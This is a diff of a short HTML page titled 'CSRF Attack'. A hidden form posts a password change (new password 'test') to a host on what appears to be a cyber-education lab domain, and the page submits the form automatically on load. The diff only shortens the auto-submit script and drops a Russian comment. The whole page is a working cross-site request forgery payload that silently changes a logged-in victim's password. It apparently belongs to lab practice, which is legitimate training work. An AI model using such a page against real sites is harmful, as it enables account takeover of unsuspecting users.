@@ -1,19 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Attack with Auto-Submit Form</title>
+    <title>CSRF Attack</title>
 </head>
 <body>
-    <form id="passwordChangeForm" action="https://web.wrzn11se9ah2h9obfbpi.labs.cyber-ed.space/main.php" method="POST">
+    <form action="https://web.wrzn11se9ah2h9obfbpi.labs.cyber-ed.space/main.php" method="POST">
         <input type="hidden" name="action" value="change_password">
         <input type="hidden" name="new_password" value="test">
     </form>
-
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Автоматически отправляем форму при загрузке страницы
-            document.getElementById('passwordChangeForm').submit();
-        });
+        document.forms[0].submit();
     </script>
 </body>
 </html>
